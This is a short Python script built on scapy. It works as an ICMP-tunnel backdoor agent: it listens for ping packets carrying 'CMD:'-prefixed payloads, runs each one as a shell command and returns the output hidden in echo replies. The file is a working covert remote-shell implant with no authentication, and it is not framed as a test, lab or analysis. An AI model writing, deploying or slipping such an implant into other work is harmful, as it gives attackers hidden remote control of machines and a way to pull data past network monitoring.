#!/usr/bin/env python3
import subprocess
import time
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send, sniff
from scapy.layers.inet import Raw

def handle_icmp(pkt):
    # Only process echo requests (ICMP type 8) with a Raw payload.
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and pkt.haslayer(Raw):
        try:
            payload = pkt[Raw].load.decode(errors="ignore").strip()
            # Expect commands with a "CMD:" prefix.
            if payload.startswith("CMD:"):
                command = payload[4:].strip()
                print(f"Agent: Received command: {command}")
                try:
                    # Execute the command and capture output with timeout.
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
                except subprocess.TimeoutExpired:
                    output = "Command timed out after 30 seconds".encode()
                except subprocess.CalledProcessError as e:
                    output = e.output
                except Exception as e:
                    output = f"Execution failed: {e}".encode()
                
                # Build an echo reply (ICMP type 0) with the command output.
                reply = IP(dst=pkt[IP].src) / ICMP(type=0) / Raw(load=output)
                send(reply, verbose=False)
                print(f"Agent: Sent response of {len(output)} bytes.")
        except Exception as e:
            print(f"Agent: Error processing ICMP packet: {e}")

if __name__ == "__main__":
    print("Agent: Listening for ICMP commands...")
    try:
        sniff(filter="icmp", prn=handle_icmp, store=False)
    except KeyboardInterrupt:
        print("Agent: Stopped by user.")
    except Exception as e:
        print(f"Agent: Error: {e}")
        exit(1)
